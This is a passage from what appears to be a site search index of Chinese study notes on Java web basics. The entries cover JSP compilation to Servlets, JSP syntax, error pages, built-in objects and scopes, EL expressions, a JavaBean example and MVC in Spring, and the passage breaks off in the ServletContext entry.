\u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u8bbf\u95ee\u7684jsp\u9875\u9762\u4f1a\u751f\u6210\u5bf9\u5e94\u7684java\u7a0b\u5e8f\uff0cJSP\u6700\u7ec8\u4f1a\u8f6c\u6362\u6210Servlet\uff0c\u6d4f\u89c8\u5668\u6700\u540e\u8bbf\u95ee\u7684\u5176\u5b9e\u662fServlet\u3002 // \u521d\u59cb\u5316 public void _jspInit () { } // \u9500\u6bc1 public void _jspDestroy () { } //JSP Service public void _jspService ( final javax . servlet . http . HttpServletRequest request , final javax . servlet . http . HttpServletResponse response ) throws java . io . IOException , javax . servlet . ServletException { } 1. \u5224\u65ad\u8bf7\u6c42 2. \u5185\u7f6e\u4e00\u4e9b\u5bf9\u8c61 final javax . servlet . jsp . PageContext pageContext ; // \u9875\u9762\u4e0a\u4e0b\u6587 javax . servlet . http . HttpSession session = null ; // session final javax . servlet . ServletContext application ; // Servlet\u4e0a\u4e0b\u6587 final javax . servlet . ServletConfig config ; // config javax . servlet . jsp . JspWriter out = null ; // out final java . lang . Object page = this ; // \u5f53\u524d\u9875 javax . servlet . jsp . JspWriter _jspx_out = null ; javax . servlet . jsp . PageContext _jspx_page_context = null ; HttpServletRequest request // \u8bf7\u6c42 HttpServletResponse response // \u54cd\u5e94 3. \u7ed9\u5bf9\u8c61\u8d4b\u503c response . setContentType ( \"text/html\" ); pageContext = _jspxFactory . getPageContext ( this , request , response , null , true , 8192 , true ); _jspx_page_context = pageContext ; application = pageContext . getServletContext (); config = pageContext . getServletConfig (); session = pageContext . getSession (); out = pageContext . getOut (); _jspx_out = out ; 4. \u4ee5\u4e0a\u5bf9\u8c61\u53ef\u4ee5\u5728jsp\u9875\u9762\u4e2d\u76f4\u63a5\u4f7f\u7528","title":"JSP\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u57fa\u7840\u8bed\u6cd5","text":"","title":"JSP\u57fa\u7840\u8bed\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u5bfc\u5165\u4f9d\u8d56","text":"JSTL(JSP\u6807\u51c6\u6807\u7b7e\u5e93)\u662f\u4e00\u4e2aJSP\u6807\u7b7e\u96c6\u5408\uff0c\u5b83\u5c01\u88c5\u4e86JSP\u5e94\u7528\u7684\u901a\u7528\u6838\u5fc3\u529f\u80fd\u3002 <dependency> <groupId> javax.servlet.jsp.jstl </groupId> <artifactId> jstl </artifactId> <version> 1.2 </version> </dependency>","title":"\u5bfc\u5165\u4f9d\u8d56"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u4e2d\u6587\u4e71\u7801\u95ee\u9898","text":"<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>","title":"\u4e2d\u6587\u4e71\u7801\u95ee\u9898"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u57fa\u7840\u8bed\u6cd5","text":"jsp\u4e0d\u4ec5\u652f\u6301java\u7684\u5168\u90e8\u8bed\u6cd5\uff0c\u800c\u4e14\u6709\u81ea\u5df1\u7684\u6269\u5145\u8bed\u6cd5\uff0c\u6458\u81ea JSP\u8bed\u6cd5 - \u83dc\u9e1f\u6559\u7a0b","title":"\u57fa\u7840\u8bed\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u811a\u672c\u7a0b\u5e8f","text":"<% java\u4ee3\u7801\u7247\u6bb5 %> \u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u7684JAVA\u8bed\u53e5","title":"\u811a\u672c\u7a0b\u5e8f"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u8868\u8fbe\u5f0f","text":"<%= java\u4ee3\u7801\u7247\u6bb5 %> JSP\u8868\u8fbe\u5f0f\uff0c\u4f1a\u5c06\u8ba1\u7b97\u5f97\u5230\u7684\u8868\u8fbe\u5f0f\u76f4\u63a5\u8f93\u51fa","title":"JSP\u8868\u8fbe\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u58f0\u660e","text":"<%! \u58f0\u660e %> JSP\u58f0\u660e\uff0c\u4e00\u4e2a\u58f0\u660e\u8bed\u53e5\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u6216\u591a\u4e2a\u53d8\u91cf\u3001\u65b9\u6cd5\uff0c\u4f9b\u540e\u9762\u7684Java\u4ee3\u7801\u4f7f\u7528\u3002","title":"JSP\u58f0\u660e"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u6ce8\u91ca","text":"<%-- \u6ce8\u91ca--%>","title":"JSP\u6ce8\u91ca"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u6307\u4ee4","text":"<%@ directive attribute=\"value\" %> JSP\u6307\u4ee4\u7528\u6765\u8bbe\u7f6e\u4e0e\u6574\u4e2aJSP\u9875\u9762\u76f8\u5173\u7684\u5c5e\u6027\u3002 \u8fd9\u91cc\u6709\u4e09\u79cd\u6307\u4ee4\u6807\u7b7e\uff1a \u6307\u4ee4 \u63cf\u8ff0 <%@ page ... %> \u5b9a\u4e49\u9875\u9762\u7684\u4f9d\u8d56\u5c5e\u6027\uff0c\u6bd4\u5982\u811a\u672c\u8bed\u8a00\u3001error\u9875\u9762\u3001\u7f13\u5b58\u9700\u6c42\u7b49\u7b49 <%@ include ... %> \u5305\u542b\u5176\u4ed6\u6587\u4ef6 <%@ taglib ... %> \u5f15\u5165\u6807\u7b7e\u5e93\u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49\u6807\u7b7e","title":"JSP\u6307\u4ee4"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u81ea\u5b9a\u4e49\u9519\u8bef\u9875\u9762","text":"error/500.jsp <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <%@ page isErrorPage = \"true\" %> <html> <head> <title> 500 - Error </title> </head> <body> <p> 500 error! </p> </body> </html> index.jsp <%- - index . jsp -- %> <%@ page errorPage = \"error/500.jsp\" %> <html> <head> <title> Hello world </title> </head> <body> <h2> 111 </h2> <% int a = 1 / 0 ; %> </body> </html> \u6216\u8005\u5728web.iml\u4e2d\u5168\u5c40\u8bbe\u7f6e\u9519\u8bef\u9875\u9762 <error-page> <error-code> 404 </error-code> <location> /error/404.jsp </location> </error-page>","title":"\u81ea\u5b9a\u4e49\u9519\u8bef\u9875\u9762"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u5305\u542b\u5171\u6709\u6587\u4ef6","text":"common/header.jsp <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <p> this is header </p> common/footer.jsp <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <p> this is footer </p> index.jsp <%@ page errorPage = \"error/500.jsp\" %> <html> <head> <title> Hello world </title> </head> <body> <%@ include file = \"common/header.jsp\" %> <h2> content </h2> <%@ include file = \"common/footer.jsp\" %> </body> </html> \u503c\u5f97\u4e00\u63d0\u7684\u662f\u4f7f\u7528 <jsp:include page=\"\"/> \u4e5f\u53ef\u4ee5\u5b9e\u73b0\u4e00\u6837\u7684\u4e8b\u60c5\uff0c\u8fd9\u6807\u7b7e\u4e0e\u4e0a\u9762\u6807\u7b7e\u7684\u533a\u522b\u662f\u5e95\u5c42\u5b9e\u73b0\u4e0d\u540c\uff0c\u8be5\u6807\u7b7e\u5e95\u5c42\u901a\u8fc7\u62fc\u63a5\u9875\u9762\u5b9e\u73b0","title":"\u5305\u542b\u5171\u6709\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u4e5d\u5927\u5185\u7f6e\u5bf9\u8c61","text":"PageContext Request Response Session Application [ServletContext] config [ServletConfig] out page exception \u4f5c\u7528\u57df: - pageContext: \u53ea\u5728\u4e00\u4e2a\u9875\u9762\u4e2d\u6709\u6548 - request: \u53ea\u5728\u4e00\u6b21\u8bf7\u6c42\u4e2d\u6709\u6548 - session: \u53ea\u5728\u4e00\u6b21\u4f1a\u8bdd\u4e2d\u6709\u6548 - application: \u5728\u6574\u4e2a\u5e94\u7528\u4e2d\u6709\u6548 <%@ page contentType = \"text/html;charset=UTF-8\" language = \"java\" %> <html> <head> <title> Title </title> </head> <body> <% pageContext . setAttribute ( \"name1\" , \"test1\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u53ea\u5728\u4e00\u4e2a\u9875\u9762\u6709\u6548 request . setAttribute ( \"name2\" , \"test2\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u53ea\u5728\u4e00\u6b21\u8bf7\u6c42\u4e2d\u6709\u6548 session . setAttribute ( \"name3\" , \"test3\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u53ea\u5728\u4e00\u6b21\u4f1a\u8bdd\u4e2d\u6709\u6548 application . setAttribute ( \"name4\" , \"test4\" ); // \u4fdd\u5b58\u7684\u6570\u636e\u5728\u6574\u4e2a\u5e94\u7528\u4e2d\u6709\u6548 %> <% // getAttribute\u548cfindAttribute\u7684\u533a\u522b: // getAttribute: \u5728page scope\u5185\u67e5\u627e\u4e0ename\u76f8\u5173\u7684\u5c5e\u6027\uff0c\u627e\u5230\u8fd4\u56de\u5c31\u8fd4\u56de\u5bf9\u8c61\uff0c\u627e\u4e0d\u5230\u5c31\u8fd4\u56denull\u3002 // findAttribute: \u4f9d\u6b21\u5728page\uff0crequest\uff0csession\uff08\u5982\u679c\u6709\u6548\u7684\u8bdd\uff09\u548capplication Scope\uff08\u8303\u56f4\uff09\u67e5\u627e\u4ee5name\u4e3a\u540d\u7684Attribute\uff0c\u627e\u5230\u5c31\u8fd4\u56de\u5bf9\u8c61\uff0c\u90fd\u627e\u4e0d\u5230\u8fd4\u56denull String name1 = ( String ) pageContext . getAttribute ( \"name1\" ); String name2 = ( String ) pageContext . findAttribute ( \"name2\" ); String name3 = ( String ) pageContext . findAttribute ( \"name3\" ); String name4 = ( String ) pageContext . findAttribute ( \"name4\" ); %> <h2> ${name1} </h2> <h2> ${name2} </h2> <h2> ${name3} </h2> <h2> ${name4} </h2> </body> </html>","title":"\u4e5d\u5927\u5185\u7f6e\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u6807\u7b7e","text":"<jsp:action_name attribute=\"value\" /> \u884c\u4e3a\u6807\u7b7e\u57fa\u672c\u4e0a\u662f\u4e00\u4e9b\u9884\u5148\u5c31\u5b9a\u4e49\u597d\u7684\u51fd\u6570\uff0c\u4e0b\u8868\u7f57\u5217\u51fa\u4e86\u4e00\u4e9b\u53ef\u7528\u7684JSP\u884c\u4e3a\u6807\u7b7e: \u8bed\u6cd5 \u63cf\u8ff0 jsp:include \u7528\u4e8e\u5728\u5f53\u524d\u9875\u9762\u4e2d\u5305\u542b\u9759\u6001\u6216\u52a8\u6001\u8d44\u6e90 jsp:useBean \u5bfb\u627e\u548c\u521d\u59cb\u5316\u4e00\u4e2aJavaBean\u7ec4\u4ef6 jsp:setProperty \u8bbe\u7f6e JavaBean\u7ec4\u4ef6\u7684\u503c jsp:getProperty \u5c06 JavaBean\u7ec4\u4ef6\u7684\u503c\u63d2\u5165\u5230 output\u4e2d jsp:forward \u4ece\u4e00\u4e2aJSP\u6587\u4ef6\u5411\u53e6\u4e00\u4e2a\u6587\u4ef6\u4f20\u9012\u4e00\u4e2a\u5305\u542b\u7528\u6237\u8bf7\u6c42\u7684request\u5bf9\u8c61 jsp:plugin \u7528\u4e8e\u5728\u751f\u6210\u7684HTML\u9875\u9762\u4e2d\u5305\u542bApplet\u548cJavaBean\u5bf9\u8c61 jsp:element \u52a8\u6001\u521b\u5efa\u4e00\u4e2aXML\u5143\u7d20 jsp:attribute \u5b9a\u4e49\u52a8\u6001\u521b\u5efa\u7684XML\u5143\u7d20\u7684\u5c5e\u6027 jsp:body \u5b9a\u4e49\u52a8\u6001\u521b\u5efa\u7684XML\u5143\u7d20\u7684\u4e3b\u4f53 jsp:text \u7528\u4e8e\u5c01\u88c5\u6a21\u677f\u6570\u636e","title":"JSP\u6807\u7b7e"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jstl\u6807\u7b7e","text":"\u5b89\u88c5\u548c\u914d\u7f6e\u53c2\u8003 JSTL \u4f7f\u7528\u4e0d\u591a\uff0c\u7565","title":"JSTL\u6807\u7b7e"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#el\u8868\u8fbe\u5f0f","text":"\u7b80\u5355\u8bed\u6cd5: ${expr} \u3002\u5176\u4e2d\uff0cexpr\u6307\u7684\u662f\u8868\u8fbe\u5f0f\u3002\u5728JSP EL\u4e2d\u901a\u7528\u7684\u64cd\u4f5c\u7b26\u662f . \u548c {} \u3002\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u7b26\u5141\u8bb8\u60a8\u901a\u8fc7\u5185\u5d4c\u7684JSP\u5bf9\u8c61\u8bbf\u95ee\u5404\u79cd\u5404\u6837\u7684JavaBean\u5c5e\u6027\u3002 JSP EL\u652f\u6301\u4e0b\u8868\u5217\u51fa\u7684\u9690\u542b\u5bf9\u8c61\uff1a \u9690\u542b\u5bf9\u8c61 \u63cf\u8ff0 pageScope page \u4f5c\u7528\u57df requestScope request \u4f5c\u7528\u57df sessionScope session \u4f5c\u7528\u57df applicationScope application \u4f5c\u7528\u57df param Request \u5bf9\u8c61\u7684\u53c2\u6570\uff0c\u5b57\u7b26\u4e32 paramValues Request\u5bf9\u8c61\u7684\u53c2\u6570\uff0c\u5b57\u7b26\u4e32\u96c6\u5408 header HTTP \u4fe1\u606f\u5934\uff0c\u5b57\u7b26\u4e32 headerValues HTTP \u4fe1\u606f\u5934\uff0c\u5b57\u7b26\u4e32\u96c6\u5408 initParam \u4e0a\u4e0b\u6587\u521d\u59cb\u5316\u53c2\u6570 cookie Cookie\u503c pageContext \u5f53\u524d\u9875\u9762\u7684pageContext","title":"EL\u8868\u8fbe\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#jsp\u7684\u7f3a\u70b9","text":"\u6458\u81ea \u77e5\u4e4e - # jsp\u4e3a\u4ec0\u4e48\u88ab\u6dd8\u6c70\u4e86\uff1f \u52a8\u6001\u8d44\u6e90\u548c\u9759\u6001\u8d44\u6e90\u5168\u90e8\u8026\u5408\u5728\u4e00\u8d77\uff0c\u65e0\u6cd5\u505a\u5230\u771f\u6b63\u7684\u52a8\u9759\u5206\u79bb\u3002\u670d\u52a1\u5668\u538b\u529b\u5927\uff0c\u56e0\u4e3a\u670d\u52a1\u5668\u4f1a\u6536\u5230\u5404\u79cdhttp\u8bf7\u6c42\uff0c\u4f8b\u5982css\u7684http\u8bf7\u6c42\uff0cjs\u7684\uff0c\u56fe\u7247\u7684\uff0c\u52a8\u6001\u4ee3\u7801\u7684\u7b49\u7b49\u3002\u4e00\u65e6\u670d\u52a1\u5668\u51fa\u73b0\u72b6\u51b5\uff0c\u524d\u540e\u53f0\u4e00\u8d77\u73a9\u5b8c\uff0c\u7528\u6237\u4f53\u9a8c\u6781\u5dee\u3002 \u524d\u7aef\u5de5\u7a0b\u5e08\u505a\u597dhtml\u540e\uff0c\u9700\u8981\u7531java\u5de5\u7a0b\u5e08\u6765\u5c06html\u4fee\u6539\u6210jsp\u9875\u9762\uff0c\u51fa\u9519\u7387\u8f83\u9ad8\uff08\u56e0\u4e3a\u9875\u9762\u4e2d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5927\u91cf\u7684js\u4ee3\u7801\uff09\uff0c\u4fee\u6539\u95ee\u9898\u65f6\u9700\u8981\u53cc\u65b9\u534f\u540c\u5f00\u53d1\uff0c\u6548\u7387\u4f4e\u4e0b\u3002 jsp\u5fc5\u987b\u8981\u5728\u652f\u6301java\u7684web\u670d\u52a1\u5668\u91cc\u8fd0\u884c\uff08\u4f8b\u5982tomcat\u7b49\uff09\uff0c\u65e0\u6cd5\u4f7f\u7528nginx\u7b49\uff08nginx\u636e\u8bf4\u5355\u5b9e\u4f8bhttp\u5e76\u53d1\u9ad8\u8fbe5w\uff0c\u8fd9\u4e2a\u4f18\u52bf\u8981\u7528\u4e0a\uff09\uff0c\u6027\u80fd\u63d0\u4e0d\u4e0a\u6765\u3002 \u7b2c\u4e00\u6b21\u8bf7\u6c42jsp\uff0c\u5fc5\u987b\u8981\u5728web\u670d\u52a1\u5668\u4e2d\u7f16\u8bd1\u6210servlet\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884c\u4f1a\u8f83\u6162\u3002 \u6bcf\u6b21\u8bf7\u6c42jsp\u90fd\u662f\u8bbf\u95eeservlet\u518d\u7528\u8f93\u51fa\u6d41\u8f93\u51fa\u7684html\u9875\u9762\uff0c\u6548\u7387\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528html\u9ad8\u3002 jsp\u5185\u6709\u8f83\u591a\u6807\u7b7e\u548c\u8868\u8fbe\u5f0f\uff0c\u524d\u7aef\u5de5\u7a0b\u5e08\u5728\u4fee\u6539\u9875\u9762\u65f6\u4f1a\u6349\u895f\u89c1\u8098\uff0c\u9047\u5230\u5f88\u591a\u75db\u70b9\u3002 \u5982\u679cjsp\u4e2d\u7684\u5185\u5bb9\u5f88\u591a\uff0c\u9875\u9762\u54cd\u5e94\u4f1a\u5f88\u6162\uff0c\u56e0\u4e3a\u662f\u540c\u6b65\u52a0\u8f7d\u3002","title":"JSP\u7684\u7f3a\u70b9"},{"location":"%E5%AE%89%E5%85%A8/java/web/JSP/#\u603b\u7ed3","text":"\u672c\u8282\u4e3b\u8981\u4ecb\u7ecd\u4e86JSP\u7684\u57fa\u7840\u8bed\u6cd5\uff0cJSTL\u6807\u7b7e\u548cEL\u8868\u8fbe\u5f0f\uff0c\u540c\u65f6\u8bf4\u660e\u4e86JSP\u88ab\u6dd8\u6c70\u7684\u539f\u56e0\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/JavaBean/","tags":["java"],"text":"JavaBean # Bean # Bean\u5176\u5b9e\u662f\u4e00\u4e2a\u7b26\u5408\u89c4\u8303\u7684\u5b9e\u4f53\u7c7b - \u6240\u6709\u5c5e\u6027\u4e3aprivate - \u63d0\u4f9b\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5 - \u63d0\u4f9bgetter\u548csetter - \u5b9e\u73b0serializable\u63a5\u53e3 \u7b80\u5355\u793a\u4f8b # package top.longlone.pojo ; import java.io.Serializable ; public class People { private int id ; private String name ; private String address ; public People () { } public int getId () { return id ; } public void setId ( int id ) { this . id = id ; } public String getName () { return name ; } public void setName ( String name ) { this . name = name ; } public String getAddress () { return address ; } public void setAddress ( String address ) { this . address = address ; } @Override public String toString () { return \"People{\" + \"id=\" + id + \", name='\" + name + '\\'' + \", address='\" + address + '\\'' + '}' ; } } \u603b\u7ed3 # \u7b80\u5355\u4e86\u89e3\u4e86Bean\u7a76\u7adf\u662f\u4e00\u4e2a\u4ec0\u4e48\u4e1c\u897f:\u4e00\u4e2a\u7b26\u5408\u89c4\u8303\u7684\u5b9e\u4f53\u7c7b","title":"JavaBean"},{"location":"%E5%AE%89%E5%85%A8/java/web/JavaBean/#javabean","text":"","title":"JavaBean"},{"location":"%E5%AE%89%E5%85%A8/java/web/JavaBean/#bean","text":"Bean\u5176\u5b9e\u662f\u4e00\u4e2a\u7b26\u5408\u89c4\u8303\u7684\u5b9e\u4f53\u7c7b - \u6240\u6709\u5c5e\u6027\u4e3aprivate - \u63d0\u4f9b\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5 - \u63d0\u4f9bgetter\u548csetter - \u5b9e\u73b0serializable\u63a5\u53e3","title":"Bean"},{"location":"%E5%AE%89%E5%85%A8/java/web/JavaBean/#\u7b80\u5355\u793a\u4f8b","text":"package top.longlone.pojo ; import java.io.Serializable ; public class People { private int id ; private String name ; private String address ; public People () { } public int getId () { return id ; } public void setId ( int id ) { this . id = id ; } public String getName () { return name ; } public void setName ( String name ) { this . name = name ; } public String getAddress () { return address ; } public void setAddress ( String address ) { this . address = address ; } @Override public String toString () { return \"People{\" + \"id=\" + id + \", name='\" + name + '\\'' + \", address='\" + address + '\\'' + '}' ; } }","title":"\u7b80\u5355\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/web/JavaBean/#\u603b\u7ed3","text":"\u7b80\u5355\u4e86\u89e3\u4e86Bean\u7a76\u7adf\u662f\u4e00\u4e2a\u4ec0\u4e48\u4e1c\u897f:\u4e00\u4e2a\u7b26\u5408\u89c4\u8303\u7684\u5b9e\u4f53\u7c7b","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/Listener/","tags":["java"],"text":"Listener # Listener\uff08\u76d1\u542c\u5668\uff09\u5c31\u662f\u4e00\u4e2a\u5b9e\u73b0\u7279\u5b9a\u63a5\u53e3\u7684\u666e\u901ajava\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e13\u95e8\u7528\u4e8e\u76d1\u542c\u53e6\u4e00\u4e2ajava\u5bf9\u8c61\u7684\u65b9\u6cd5\u8c03\u7528\u6216\u5c5e\u6027\u6539\u53d8\uff0c\u5f53\u88ab\u76d1\u542c\u5bf9\u8c61\u53d1\u751f\u4e0a\u8ff0\u4e8b\u4ef6\u540e\uff0c\u76d1\u542c\u5668\u67d0\u4e2a\u65b9\u6cd5\u5c06\u7acb\u5373\u88ab\u6267\u884c\u3002Listener\u5e38\u7528\u4e8eGUI\u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002 \u7531\u4e8e\u7528\u5230Listener\u7684\u5730\u65b9\u4e0d\u591a\uff0c\u5c31\u8df3\u8fc7\u4e86\uff0c\u540e\u7eed\u5982\u679c\u7528\u5230\u518d\u8865\u4e0a\u3002","title":"Listener"},{"location":"%E5%AE%89%E5%85%A8/java/web/Listener/#listener","text":"Listener\uff08\u76d1\u542c\u5668\uff09\u5c31\u662f\u4e00\u4e2a\u5b9e\u73b0\u7279\u5b9a\u63a5\u53e3\u7684\u666e\u901ajava\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e13\u95e8\u7528\u4e8e\u76d1\u542c\u53e6\u4e00\u4e2ajava\u5bf9\u8c61\u7684\u65b9\u6cd5\u8c03\u7528\u6216\u5c5e\u6027\u6539\u53d8\uff0c\u5f53\u88ab\u76d1\u542c\u5bf9\u8c61\u53d1\u751f\u4e0a\u8ff0\u4e8b\u4ef6\u540e\uff0c\u76d1\u542c\u5668\u67d0\u4e2a\u65b9\u6cd5\u5c06\u7acb\u5373\u88ab\u6267\u884c\u3002Listener\u5e38\u7528\u4e8eGUI\u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002 \u7531\u4e8e\u7528\u5230Listener\u7684\u5730\u65b9\u4e0d\u591a\uff0c\u5c31\u8df3\u8fc7\u4e86\uff0c\u540e\u7eed\u5982\u679c\u7528\u5230\u518d\u8865\u4e0a\u3002","title":"Listener"},{"location":"%E5%AE%89%E5%85%A8/java/web/MVC/","tags":["java"],"text":"MVC # \u53c2\u8003\u4e86 \u6d45\u8c08 MVC\u3001MVP \u548c MVVM \u67b6\u6784\u6a21\u5f0f MVC\u67b6\u6784 # M - model - \u6a21\u578b: \u7ba1\u7406\u5e94\u7528\u7684\u884c\u4e3a\u548c\u6570\u636e\uff0c\u54cd\u5e94\u6570\u636e\u8bf7\u6c42\uff08\u7ecf\u5e38\u6765\u81ea\u89c6\u56fe\uff09\u548c\u66f4\u65b0\u72b6\u6001\u7684\u6307\u4ee4\uff08\u7ecf\u5e38\u6765\u81ea\u63a7\u5236\u5668\uff09 V - view - \u89c6\u56fe: \u7ba1\u7406\u4f5c\u4e3a\u4f4d\u56fe\u5c55\u793a\u5230\u5c4f\u5e55\u4e0a\u7684\u56fe\u5f62\u548c\u6587\u5b57\u8f93\u51fa\uff1b C - controller - \u63a7\u5236\u5668: \u7ffb\u8bd1\u7528\u6237\u7684\u8f93\u5165\u5e76\u4f9d\u7167\u7528\u6237\u7684\u8f93\u5165\u64cd\u4f5c\u6a21\u578b\u548c\u89c6\u56fe\uff1b \u63a7\u5236\u5668\u8d1f\u8d23\u5bf9\u6a21\u578b\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u66f4\u65b0\uff0c\u800c\u89c6\u56fe\u5411\u6a21\u578b\u4e2d\u8bf7\u6c42\u6570\u636e\uff1b\u5f53\u6709\u7528\u6237\u7684\u884c\u4e3a\u89e6\u53d1\u64cd\u4f5c\u65f6\uff0c\u4f1a\u6709\u63a7\u5236\u5668\u66f4\u65b0\u6a21\u578b\uff0c\u5e76\u901a\u77e5\u89c6\u56fe\u8fdb\u884c\u66f4\u65b0\uff0c\u5728\u8fd9\u65f6\u89c6\u56fe\u5411\u6a21\u578b\u8bf7\u6c42\u65b0\u7684\u6570\u636e\uff0c\u800c\u8fd9\u5c31\u662f \u4f5c\u8005\u6240\u7406\u89e3\u7684 \u6807\u51c6 MVC \u6a21\u5f0f\u4e0b\uff0cModel\u3001View \u548c Controller \u4e4b\u95f4\u7684\u534f\u4f5c\u65b9\u5f0f\u3002 Spring\u4e2d\u7684MVC\u67b6\u6784 # Spring\u4e2d\u7684MVC\u548c\u6807\u51c6\u7684MVC\u67b6\u6784\u6709\u4e9b\u4e0d\u540c \u901a\u8fc7 DispatchServlet \u5c06\u63a7\u5236\u5668\u5c42\u548c\u89c6\u56fe\u5c42\u5b8c\u5168\u89e3\u8026\uff1b \u89c6\u56fe\u5c42\u548c\u6a21\u578b\u5c42\u4e4b\u95f4\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\uff0c\u53ea\u6709\u95f4\u63a5\u5173\u7cfb\uff0c\u901a\u8fc7\u63a7\u5236\u5668\u5bf9\u6a21\u578b\u8fdb\u884c\u67e5\u8be2\u3001\u8fd4\u56de\u7ed9 DispatchServlet \u540e\u518d\u4f20\u9012\u81f3\u89c6\u56fe\u5c42\uff1b","title":"MVC"},{"location":"%E5%AE%89%E5%85%A8/java/web/MVC/#mvc","text":"\u53c2\u8003\u4e86 \u6d45\u8c08 MVC\u3001MVP \u548c MVVM \u67b6\u6784\u6a21\u5f0f","title":"MVC"},{"location":"%E5%AE%89%E5%85%A8/java/web/MVC/#mvc\u67b6\u6784","text":"M - model - \u6a21\u578b: \u7ba1\u7406\u5e94\u7528\u7684\u884c\u4e3a\u548c\u6570\u636e\uff0c\u54cd\u5e94\u6570\u636e\u8bf7\u6c42\uff08\u7ecf\u5e38\u6765\u81ea\u89c6\u56fe\uff09\u548c\u66f4\u65b0\u72b6\u6001\u7684\u6307\u4ee4\uff08\u7ecf\u5e38\u6765\u81ea\u63a7\u5236\u5668\uff09 V - view - \u89c6\u56fe: \u7ba1\u7406\u4f5c\u4e3a\u4f4d\u56fe\u5c55\u793a\u5230\u5c4f\u5e55\u4e0a\u7684\u56fe\u5f62\u548c\u6587\u5b57\u8f93\u51fa\uff1b C - controller - \u63a7\u5236\u5668: \u7ffb\u8bd1\u7528\u6237\u7684\u8f93\u5165\u5e76\u4f9d\u7167\u7528\u6237\u7684\u8f93\u5165\u64cd\u4f5c\u6a21\u578b\u548c\u89c6\u56fe\uff1b \u63a7\u5236\u5668\u8d1f\u8d23\u5bf9\u6a21\u578b\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u66f4\u65b0\uff0c\u800c\u89c6\u56fe\u5411\u6a21\u578b\u4e2d\u8bf7\u6c42\u6570\u636e\uff1b\u5f53\u6709\u7528\u6237\u7684\u884c\u4e3a\u89e6\u53d1\u64cd\u4f5c\u65f6\uff0c\u4f1a\u6709\u63a7\u5236\u5668\u66f4\u65b0\u6a21\u578b\uff0c\u5e76\u901a\u77e5\u89c6\u56fe\u8fdb\u884c\u66f4\u65b0\uff0c\u5728\u8fd9\u65f6\u89c6\u56fe\u5411\u6a21\u578b\u8bf7\u6c42\u65b0\u7684\u6570\u636e\uff0c\u800c\u8fd9\u5c31\u662f \u4f5c\u8005\u6240\u7406\u89e3\u7684 \u6807\u51c6 MVC \u6a21\u5f0f\u4e0b\uff0cModel\u3001View \u548c Controller \u4e4b\u95f4\u7684\u534f\u4f5c\u65b9\u5f0f\u3002","title":"MVC\u67b6\u6784"},{"location":"%E5%AE%89%E5%85%A8/java/web/MVC/#spring\u4e2d\u7684mvc\u67b6\u6784","text":"Spring\u4e2d\u7684MVC\u548c\u6807\u51c6\u7684MVC\u67b6\u6784\u6709\u4e9b\u4e0d\u540c \u901a\u8fc7 DispatchServlet \u5c06\u63a7\u5236\u5668\u5c42\u548c\u89c6\u56fe\u5c42\u5b8c\u5168\u89e3\u8026\uff1b \u89c6\u56fe\u5c42\u548c\u6a21\u578b\u5c42\u4e4b\u95f4\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\uff0c\u53ea\u6709\u95f4\u63a5\u5173\u7cfb\uff0c\u901a\u8fc7\u63a7\u5236\u5668\u5bf9\u6a21\u578b\u8fdb\u884c\u67e5\u8be2\u3001\u8fd4\u56de\u7ed9 DispatchServlet \u540e\u518d\u4f20\u9012\u81f3\u89c6\u56fe\u5c42\uff1b","title":"Spring\u4e2d\u7684MVC\u67b6\u6784"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/","tags":["java"],"text":"ServletContext # ServletContext\uff0cServlet\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0cweb\u5bb9\u5668\u5728\u542f\u52a8\u7684\u65f6\u5019,\u5b83\u4f1a\u4e3a\u6bcf\u4e2aweb\u7a0b\u5e8f\u90fd\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94\u7684 